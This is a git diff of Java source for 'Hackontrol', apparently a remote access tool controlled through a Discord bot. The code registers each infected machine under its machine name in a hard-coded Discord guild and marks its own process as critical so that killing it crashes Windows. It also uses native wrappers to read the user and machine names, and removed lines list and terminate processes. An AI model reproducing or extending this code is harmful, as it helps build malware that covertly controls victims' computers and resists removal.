@@ -71,7 +71,7 @@ public class Hackontrol {
 		}
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
-		this.machineIdentifier = NativeLibrary.machineName();
+		this.machineIdentifier = Information.getMachineName();
 		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
 
 		for(int i = 0; i < this.moduleList.size(); i++) {
@@ -95,7 +95,7 @@ public class Hackontrol {
 			manager.initialize();
 		}
 
-		NativeLibrary.critical(true);
+		Kernel.setProcessCritical(true);
 	}
 
 	private Category getOrCreateCategory(Guild guild, String name) {
@@ -260,16 +260,6 @@ public class Hackontrol {
 		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\libnative32.dll");
 		System.out.println("Username: " + Information.getUserName());
 		System.out.println("Machine name: " + Information.getMachineName());
-		System.out.println("UI Access: " + Information.isEnabledUIAccess());
-		ProcessEntry[] list = Kernel.getProcessList();
-
-		for(ProcessEntry entry : list) {
-			System.out.println(entry.executableFile);
-		}
-
-		System.out.println(list.length);
-		System.out.println("PID: " + Kernel.getCurrentProcessIdentifier());
-		Kernel.terminateProcess(10016);
 	}
 
 	public static Hackontrol getInstance() {
